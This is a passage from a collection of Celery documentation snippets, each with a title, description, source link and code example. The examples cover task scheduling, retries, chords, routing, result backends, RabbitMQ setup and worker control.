https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.schedules import crontab\n\napp.conf.beat_schedule = {\n    # Executes every Monday morning at 7:30 a.m.\n    'add-every-monday-morning': {\n        'task': 'tasks.add',\n        'schedule': crontab(hour=7, minute=30, day_of_week=1),\n        'args': (16, 16),\n    },\n}\n```\n\n----------------------------------------\n\nTITLE: Setting a Remote Debug Breakpoint in a Celery Task using Python\nDESCRIPTION: This Python snippet demonstrates how to use `celery.contrib.rdb` to pause the execution of a Celery task and initiate a remote debugging session. It imports the necessary modules (`celery.task`, `celery.contrib.rdb`) and calls `rdb.set_trace()` at the desired breakpoint location within the task function `add`. This allows developers to connect remotely via telnet to inspect the task's state.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import task\nfrom celery.contrib import rdb\n\n@task()\ndef add(x, y):\n    result = x + y\n    rdb.set_trace()  # <- set break-point\n    return result\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Retry Policy in Celery\nDESCRIPTION: Example showing the full default retry policy configuration in Celery. The policy sets 3 max retries, with retry intervals starting at 0 seconds and increasing by 0.2 seconds up to a maximum of 0.2 seconds between retries.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nadd.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'interval_start': 0,\n    'interval_step': 0.2,\n    'interval_max': 0.2,\n    'retry_errors': None,\n})\n```\n\n----------------------------------------\n\nTITLE: Defining Error Callback for Celery Chords\nDESCRIPTION: Shows how to define and attach an errback to a chord to handle errors that occur during chord execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_55\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef on_chord_error(request, exc, traceback):\n    print('Task {0!r} raised error: {1!r}'.format(request.id, exc))\n```\n\n----------------------------------------\n\nTITLE: Routing Tasks to Specific Workers with worker_direct in Celery Python\nDESCRIPTION: Example of routing a task to a specific worker using the worker_direct feature, which creates a dedicated queue for each worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\ntask_routes = {\n    'tasks.add': {'exchange': 'C.dq2', 'routing_key': 'w1@example.com'}\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Automatic Queue Creation in Python\nDESCRIPTION: Example configuration for automatically creating missing queue definitions in Celery. Shows default options used when creating queues.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nCELERY_QUEUES[name] = {'exchange': name,\n                           'exchange_type': 'direct',\n                           'routing_key': 'name}\n```\n\n----------------------------------------\n\nTITLE: Lazily Using Flask App Configuration with Celery - Python\nDESCRIPTION: This example demonstrates integrating a Flask application's configuration with Celery by passing a lambda function to 'add_defaults'. The lambda function references the Flask app's config object, ensuring that Celery fetches the configuration values lazily at runtime, after the Flask app is initialized. This enables seamless configuration sharing between Flask and Celery applications.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nflask_app = Flask()\napp = Celery()\napp.add_defaults(lambda: flask_app.config)\n```\n\n----------------------------------------\n\nTITLE: Implementing Task Retry Mechanism in Celery\nDESCRIPTION: Example of a task that implements retry functionality for handling recoverable errors. The task retries itself when specific exceptions occur.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef send_twitter_status(self, oauth, tweet):\n    try:\n        twitter = Twitter(oauth)\n        twitter.update_status(tweet)\n    except (Twitter.FailWhaleError, Twitter.LoginError) as exc:\n        raise self.retry(exc=exc)\n```\n\n----------------------------------------\n\nTITLE: Linking Multiple Tasks and Error Callbacks in Celery Python\nDESCRIPTION: Illustrates how to link multiple tasks and add error callbacks to a signature in Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\n>>> s = add.s(2, 2)\n>>> s.link(mul.s(4))\n>>> s.link(log_result.s())\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> add.s(2, 2).on_error(log_error.s()).delay()\n```\n\n----------------------------------------\n\nTITLE: Defining an Error Handler as a Celery Task in Python\nDESCRIPTION: Declares a Celery task designed to receive error information as an errback, with arguments for request, exception, and traceback. This function logs details about failed tasks. Requires declaration as a Celery task and is meant to be set as link_error in apply_async calls.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef error_handler(request, exc, traceback):\n    print('Task {0} raised exception: {1!r}\\n{2!r}'.format(\n          request.id, exc, traceback))\n```\n\n----------------------------------------\n\nTITLE: Using Reject Semipredicate for Dead Letter Exchange\nDESCRIPTION: Demonstrates using the Reject exception to send tasks to a Dead Letter Exchange when an out of memory condition occurs. Requires acks_late=True to function properly.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_34\n\nLANGUAGE: python\nCODE:\n```\nimport errno\nfrom celery.exceptions import Reject\n\n@app.task(bind=True, acks_late=True)\ndef render_scene(self, path):\n    file = get_file(path)\n    try:\n        renderer.render_scene(file)\n\n    # if the file is too big to fit in memory\n    # we reject it so that it's redelivered to the dead letter exchange\n    # and we can manually inspect the situation.\n    except MemoryError as exc:\n        raise Reject(exc, requeue=False)\n    except OSError as exc:\n        if exc.errno == errno.ENOMEM:\n            raise Reject(exc, requeue=False)\n\n    # For any other error we retry after 10 seconds.\n    except Exception as exc:\n        raise self.retry(exc, countdown=10)\n```\n\n----------------------------------------\n\nTITLE: Registering Class-Based Celery Tasks in Python\nDESCRIPTION: Example showing how to register a class-based task in Celery 4.0.1+ using the app.register_task method. This approach replaces previous methods of registering class-based tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery, Task\n\napp = Celery()\n\nclass CustomTask(Task):\n\n    def run(self):\n        return 'hello'\n\napp.register_task(CustomTask())\n```\n\n----------------------------------------\n\nTITLE: Manual Connection Handling in Celery\nDESCRIPTION: Example demonstrating manual connection handling with connection pools in Celery for multiple task executions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nnumbers = [(2, 2), (4, 4), (8, 8), (16, 16)]\nresults = []\nwith add.app.pool.acquire(block=True) as connection:\n    with add.get_publisher(connection) as publisher:\n        try:\n            for i, j in numbers:\n                res = add.apply_async((i, j), publisher=publisher)\n                results.append(res)\nprint([res.get() for res in results])\n```\n\n----------------------------------------\n\nTITLE: Annotating Default Retry Delay for Chord Unlock Tasks - Python\nDESCRIPTION: This snippet shows how to annotate Celery's 'celery.chord_unlock' task to set a new default retry delay using the CELERY_ANNOTATIONS dictionary in the application's configuration. This enables changing the retry interval for chord unlock tasks globally, and can also be fine-tuned per task basis. The dictionary must be present in the application's configuration module or settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ANNOTATIONS = {\n    'celery.chord_unlock': {\n        'default_retry_delay': 10.0,\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Immutable Signatures in Group in Celery Python\nDESCRIPTION: Demonstrates how to use immutable signatures in a group to prevent argument forwarding from the previous task in a chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\n>>> res = (add.s(4, 4) | group(add.si(i, i) for i in range(10)))()\n>>> res.get()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n>>> res.parent.get()\n8\n```\n\n----------------------------------------\n\nTITLE: Configuring MongoDB Result Backend in Celery\nDESCRIPTION: Example configuration for the MongoDB result backend, showing how to set the backend URL and configure additional settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'mongodb://localhost:27017/'\nmongodb_backend_settings = {\n    'database': 'mydb',\n    'taskmeta_collection': 'my_taskmeta_collection',\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with pip\nDESCRIPTION: Command to install Celery Python package using pip package manager.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery\n```\n\n----------------------------------------\n\nTITLE: Configuring Retry Policy with Timeout Error Handling in Celery\nDESCRIPTION: Example of configuring a specific retry policy that only retries tasks that encounter TimeoutError exceptions. The policy specifies a maximum of 3 retries and includes the TimeoutError class in the retry_errors tuple.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu.exceptions import TimeoutError\n\nadd.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'retry_errors': (TimeoutError, ),\n})\n```\n\n----------------------------------------\n\nTITLE: Changing Rate Limits at Runtime in Celery\nDESCRIPTION: Examples showing how to modify task rate limits at runtime for all workers or specific workers using the rate_limit control command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_20\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.rate_limit('myapp.mytask', '200/m')\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.rate_limit('myapp.mytask', '200/m',\n...            destination=['celery@worker1.example.com'])\n```\n\n----------------------------------------\n\nTITLE: Getting Registered Tasks from Workers\nDESCRIPTION: Python code to retrieve registered tasks from workers using the inspect interface. Shows how to get a list of task names registered in workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_34\n\nLANGUAGE: pycon\nCODE:\n```\n>>> i.registered()\n[{'worker1.example.com': ['tasks.add',\n                          'tasks.sleeptask']}]\n```\n\n----------------------------------------\n\nTITLE: Installing Celery via pip\nDESCRIPTION: Basic command to install or upgrade Celery using pip package manager.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/installation.txt#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -U Celery\n```\n\n----------------------------------------\n\nTITLE: Handling Task Connection Errors on Delay - Pycon\nDESCRIPTION: Demonstrates exception handling for task submission when a connection error occurs. This snippet uses a try/except block to catch and handle 'OperationalError', re-raised when a task cannot be sent due to broker issues. It prints diagnostic information about the failure, enhancing reliability and maintainability. Requires a Celery task 'add' properly registered and available in the current context.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_12\n\nLANGUAGE: pycon\nCODE:\n```\n>>> try:\\n...     add.delay(2, 2)\\n... except add.OperationalError as exc:\\n...     print('Could not send task %r: %r' % (add, exc))\n```\n\n----------------------------------------\n\nTITLE: Creating Bound Task with Retry Logic\nDESCRIPTION: Demonstrates creating a bound task that has access to self reference, allowing for better retry handling and task instance access\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef send_twitter_status(self, oauth, tweet):\n    try:\n        twitter = Twitter(oauth)\n        twitter.update_status(tweet)\n    except (Twitter.FailWhaleError, Twitter.LoginError) as exc:\n        raise self.retry(exc=exc)\n```\n\n----------------------------------------\n\nTITLE: Humanizing and Censoring Celery App Configuration in Python Interactive Shell\nDESCRIPTION: Shows use of app.conf.humanize to retrieve configuration as a censored, tabulated string for debugging/output, removing (via regex-based heuristics) sensitive information based on key substrings. Dependencies: Celery 4+ and an app object with a conf attribute present. Key parameters: with_defaults determines if built-in keys are included, censored determines if secrets are hidden.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_13\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.conf.humanize(with_defaults=False, censored=True)\n```\n\n----------------------------------------\n\nTITLE: Using Module Namespace for Celery Task Names in Python (pycon)\nDESCRIPTION: Shows the recommended practice of namespacing task names using the module path within a Python console session (`pycon`). The `name` parameter is explicitly set to 'tasks.add' in the `@app.task` decorator to ensure uniqueness across different modules.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_8\n\nLANGUAGE: pycon\nCODE:\n```\n>>> @app.task(name='tasks.add')\n>>> def add(x, y):\n...     return x + y\n```\n\n----------------------------------------\n\nTITLE: Defining a Chord and Linking Error Callback in Celery (Python)\nDESCRIPTION: Demonstrates the setup of a Celery chord, consisting of a header group (`t1`, `t2`) and a body task (`t3`). It shows linking an error callback (`error_callback_sig`) to the chord. The surrounding text explains that with the `task_allow_error_cb_on_chord_header` flag *disabled* (default behavior), if any header task fails, the body (`t3`) won't execute, and the error callback is called once for the body's implicit failure. Enabling the flag changes this behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nheader = group([t1, t2])\nbody = t3\nc = chord(header, body)\nc.link_error(error_callback_sig)\n```\n\n----------------------------------------\n\nTITLE: Chaining and Invoking Chord Tasks in Celery (Python)\nDESCRIPTION: This snippet demonstrates the creation and invocation of a Celery chord combining multiple add subtasks and reducing them with an xsum task. It highlights the proper, mutation-free way of calling a chord multiple times without altering subtask IDs. Dependencies include Celery’s chord, group, and task signature definitions ('add.s', 'xsum.s'). Key parameters are the list of subtasks and the reducer. Inputs are provided as task signatures; the output represents the scheduled chord execution. The corrected behavior ensures idempotence and prevents state mutation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_4\n\nLANGUAGE: pycon\nCODE:\n```\n>>> c = chord([add.s(2, 2), add.s(4, 4)], xsum.s())\\n>>> c()\\n>>> c() <-- call again\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Protocol Version in Celery\nDESCRIPTION: Code example showing how to set the task protocol version to maintain backward compatibility with Celery 3.x. This allows users to continue using the old protocol after upgrading to Celery 4.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\napp = Celery()\napp.conf.task_protocol = 1\n```\n\n----------------------------------------\n\nTITLE: Using the Limit Argument in Celery Inspect - Python\nDESCRIPTION: This snippet demonstrates the use of the 'limit' argument with the 'control.inspect' method to restrict the number of workers or replies to inspect commands. By setting 'limit=1', only one worker is polled for information when invoking the 'ping' method. This is useful for monitoring or debugging scenarios where full cluster replies are not needed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nmyapp.control.inspect(limit=1).ping()\n```\n\n----------------------------------------\n\nTITLE: Executing Chord in Celery Python\nDESCRIPTION: Demonstrates how to create and execute a chord in Celery. A chord consists of a group of tasks executed in parallel, followed by a callback task that processes the results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_31\n\nLANGUAGE: python\nCODE:\n```\n>>> res = chord((add.s(i, i) for i in range(10)), tsum.s())()\n>>> res.get()\n90\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Signature Asynchronously in Python\nDESCRIPTION: Shows how to execute a task defined by a signature asynchronously using either `delay()` or `apply_async()` called on the signature object. This sends the task to a Celery worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_9\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.s(2, 2).delay()\n>>> add.s(2, 2).apply_async(countdown=1)\n```\n\n----------------------------------------\n\nTITLE: Setting an Explicit Name for a Celery Task in Python (pycon)\nDESCRIPTION: Demonstrates using the `name` parameter within the `@app.task` decorator in a Python console session (`pycon`) to assign a specific unique name ('sum-of-two-numbers') to a Celery task. The task's assigned name is then verified by accessing its `.name` attribute.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_7\n\nLANGUAGE: pycon\nCODE:\n```\n>>> @app.task(name='sum-of-two-numbers')\n>>> def add(x, y):\n...     return x + y\n\n>>> add.name\n'sum-of-two-numbers'\n```\n\n----------------------------------------\n\nTITLE: Linking Celery Tasks Together Using Callbacks in Python\nDESCRIPTION: Shows how to link two Celery tasks so that the result of the first is passed as a partial argument to a callback task. Uses apply_async with the link option and a signature object. This pattern is suitable for forming chains of dependent asynchronous computations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nadd.apply_async((2, 2), link=add.s(16))\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task Monthly on a Specific Day using Crontab\nDESCRIPTION: This Python snippet configures a Celery task using `celery.schedules.crontab` to execute at midnight (00:00) on the second day of every month.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\ncrontab(0, 0, day_of_month='2')\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker with Eventlet Pool (Console)\nDESCRIPTION: This console command demonstrates how to start a Celery worker for a specified project ('proj') using the Eventlet execution pool. The '-P eventlet' flag selects Eventlet for concurrency, and '-c 1000' sets the number of concurrent green threads (coroutines) to 1000. This configuration is often beneficial for applications with high I/O wait times.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/concurrency/eventlet.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -P eventlet -c 1000\n```\n\n----------------------------------------\n\nTITLE: Cloning and Modifying Celery Signatures in Python\nDESCRIPTION: Illustrates how to create a derivative signature by cloning an existing one (`add.s(2)`) using the `clone()` method. New arguments and keyword arguments can be provided during cloning.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_14\n\nLANGUAGE: pycon\nCODE:\n```\n>>> s = add.s(2)\nproj.tasks.add(2)\n\n>>> s.clone(args=(4,), kwargs={'debug': True})\nproj.tasks.add(4, 2, debug=True)\n```\n\n----------------------------------------\n\nTITLE: Working with Result Graphs in Celery Python\nDESCRIPTION: Demonstrates how to work with result graphs in Celery, including converting graphs to dot format and creating images.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))()\n\n>>> res.parent.parent.graph\n285fa253-fcf8-42ef-8b95-0078897e83e6(1)\n    463afec2-5ed4-4036-b22d-ba067ec64f52(0)\n872c3995-6fa0-46ca-98c2-5a19155afcf0(2)\n    285fa253-fcf8-42ef-8b95-0078897e83e6(1)\n        463afec2-5ed4-4036-b22d-ba067ec64f52(0)\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> with open('graph.dot', 'w') as fh:\n...     res.parent.parent.graph.to_dot(fh)\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Celery Task Group in Python\nDESCRIPTION: Shows how to use the `celery.group` primitive to execute multiple tasks in parallel. It takes an iterable of signatures (here, a generator expression creating `add.s(i, i)` for `i` in range 10). The results are collected in a list.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_29\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import group\n>>> res = group(add.s(i, i) for i in range(10))()\n>>> res.get(timeout=1)\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n```\n\n----------------------------------------\n\nTITLE: Handling Task State Messages via Callback in Python\nDESCRIPTION: Demonstrates how to define an on_message callback function to process state change messages from a running Celery task. Includes applying the task asynchronously, retrieving its result, and printing intermediate progress updates. Relies on the prior definition of a suitable state-reporting Celery task and demonstrates client-side monitoring.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\ndef on_raw_message(body):\n    print(body)\n\na, b = 1, 1\nr = hello.apply_async(args=(a, b))\nprint(r.get(on_message=on_raw_message, propagate=False))\n```\n\n----------------------------------------\n\nTITLE: Upgrading Group to Chord in Celery Python\nDESCRIPTION: Demonstrates how chaining a group with another task automatically upgrades it to a chord. This allows for parallel execution followed by aggregation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_34\n\nLANGUAGE: python\nCODE:\n```\n>>> c3 = (group(add.s(i, i) for i in range(10)) | tsum.s())\n>>> res = c3()\n>>> res.get()\n90\n```\n\n----------------------------------------\n\nTITLE: Defining Task Error Types with throws Attribute in Python\nDESCRIPTION: This example demonstrates using the 'throws' attribute to specify expected errors that shouldn't be treated as actual errors. Errors listed in 'throws' will be reported as failures to the result backend but won't be logged as errors and won't include tracebacks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_28\n\nLANGUAGE: python\nCODE:\n```\n@task(throws=(KeyError, HttpNotFound)):\ndef get_foo():\n    something()\n```\n\n----------------------------------------\n\nTITLE: Initializing Project Layout Structure\nDESCRIPTION: Basic project directory structure showing the organization of Celery files.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsrc/\n    proj/__init__.py\n        /celery.py\n        /tasks.py\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Result Backend URLs in Celery\nDESCRIPTION: Examples of configuring result_backend setting with different database URLs for SQLite, MySQL, PostgreSQL, and Oracle backends.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n# sqlite (filename)\nresult_backend = 'db+sqlite:///results.sqlite'\n\n# mysql\nresult_backend = 'db+mysql://scott:tiger@localhost/foo'\n\n# postgresql\nresult_backend = 'db+postgresql://scott:tiger@localhost/mydatabase'\n\n# oracle\nresult_backend = 'db+oracle://scott:tiger@127.0.0.1:1521/sidname'\n```\n\n----------------------------------------\n\nTITLE: Customizing Automatic Task Name Generation in Celery using Python\nDESCRIPTION: Illustrates how to change Celery's default task naming behavior. This is done by subclassing `Celery`, overriding the `gen_task_name` method to implement custom naming logic (e.g., removing '.tasks' suffix from module names), and then instantiating the custom Celery class.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\nclass MyCelery(Celery):\n\n    def gen_task_name(self, name, module):\n        if module.endswith('.tasks'):\n            module = module[:-6]\n        return super().gen_task_name(name, module)\n\napp = MyCelery('main')\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Task Asynchronously with apply_async() in Python\nDESCRIPTION: Compares calling `apply_async` directly on the task object versus calling it on a signature object. Both methods achieve the same outcome: sending the task to a worker for asynchronous execution with specified arguments, keyword arguments, and execution options.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_7\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.apply_async(args, kwargs, **options)\n>>> add.signature(args, kwargs, **options).apply_async()\n\n>>> add.apply_async((2, 2), countdown=1)\n>>> add.signature((2, 2), countdown=1).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Creating RabbitMQ User and Virtual Host via Command Line\nDESCRIPTION: A series of RabbitMQ commands to create a new user, virtual host, set user tags, and grant permissions for Celery usage.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmqctl add_user myuser mypassword\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmqctl add_vhost myvhost\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmqctl set_user_tags myuser mytag\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo rabbitmqctl set_permissions -p myvhost myuser \".*\" \".*\" \".*\"\n```\n\n----------------------------------------\n\nTITLE: Manually Redirecting stdout/stderr to a Custom Logger in Celery\nDESCRIPTION: Example showing how to manually redirect stdout and stderr to a custom logger within a task. This is necessary when creating a logger instance in the task or module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nimport sys\n\nlogger = get_task_logger(__name__)\n\n@app.task(bind=True)\ndef add(self, x, y):\n    old_outs = sys.stdout, sys.stderr\n    rlevel = self.app.conf.worker_redirect_stdouts_level\n    try:\n        self.app.log.redirect_stdouts_to_logger(logger, rlevel)\n        print('Adding {0} + {1}'.format(x, y))\n        return x + y\n    finally:\n        sys.stdout, sys.stderr = old_outs\n```\n\n----------------------------------------\n\nTITLE: Django Transaction-Safe Task Execution\nDESCRIPTION: Improved version using transaction.on_commit to ensure task runs after successful transaction commit.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n- send_email.delay(user.pk)\n+ transaction.on_commit(lambda: send_email.delay(user.pk))\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Beat with DatabaseScheduler\nDESCRIPTION: Command to start the Celery beat service using the Django database scheduler provided by django-celery-beat, which enables storage of task schedules in the Django database.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj beat -l INFO --scheduler django_celery_beat.schedulers:DatabaseScheduler\n```\n\n----------------------------------------\n\nTITLE: Expiring a Celery Task After a Duration or DateTime in Pycon\nDESCRIPTION: Shows Celery tasks configured to expire after a given number of seconds or a specific datetime, using the expires argument to apply_async. The first example expires the task in 60 seconds, while the second demonstrates use with datetime and timezone modules for more flexible expiry control.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_12\n\nLANGUAGE: pycon\nCODE:\n```\n>>> # Task expires after one minute from now.\n>>> add.apply_async((10, 10), expires=60)\n\n>>> # Also supports datetime\n>>> from datetime import datetime, timedelta, timezone\n>>> add.apply_async((10, 10), kwargs,\n```\n\n----------------------------------------\n\nTITLE: Task Priority Inheritance Example in Celery Python\nDESCRIPTION: Demonstrates how child tasks can inherit priority from parent tasks when task_inherit_parent_priority is enabled.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\n# The last task in chain will also have priority set to 5.\nchain = celery.chain(add.s(2) | add.s(2).set(priority=5) | add.s(3))\n```\n\n----------------------------------------\n\nTITLE: Configuring Quorum Queues for Celery with RabbitMQ\nDESCRIPTION: Python code to set up a Quorum Queue for Celery tasks, including necessary broker transport options for confirmation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu import Queue\n\ntask_queues = [Queue('my-queue', queue_arguments={'x-queue-type': 'quorum'})]\nbroker_transport_options = {\"confirm_publish\": True}\n```\n\n----------------------------------------\n\nTITLE: Changing Time Limits at Runtime in Celery\nDESCRIPTION: Example demonstrating how to change both soft and hard time limits for a specific task at runtime using the time_limit remote control command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_19\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.time_limit('tasks.crawl_the_web',\n                           soft=60, hard=120, reply=True)\n[{'worker1.example.com': {'ok': 'time limits set successfully'}}]\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task Hourly with Multiple Conditions using Crontab\nDESCRIPTION: This Python snippet shows how to configure a Celery task using `celery.schedules.crontab` to execute at minute 0 of every hour that is divisible by 3, *and* also every hour between 8am (inclusive) and 5pm (inclusive, representing 17:00).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\ncrontab(minute=0, hour='*/3,8-17')\n```\n\n----------------------------------------\n\nTITLE: Resetting PeriodicTask last_run_at Field via Django Shell (Console, Python)\nDESCRIPTION: This snippet assists Django-Celery users in resetting the last_run_at field of all PeriodicTask entries, typically required after timezone changes or database migrations affecting periodic task execution. It is executed from the Python manage.py shell, requiring Django and django-celery as dependencies. The code accesses the PeriodicTask model and updates all objects to set last_run_at to None. Executing this ensures the new timezone or configuration takes effect for all periodic tasks. The commands are meant for manual execution and do not require function parameters.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py shell\\n>>> from djcelery.models import PeriodicTask\\n>>> PeriodicTask.objects.update(last_run_at=None)\n```\n\n----------------------------------------\n\nTITLE: Enabling Events on Specific Celery Workers\nDESCRIPTION: Uses the 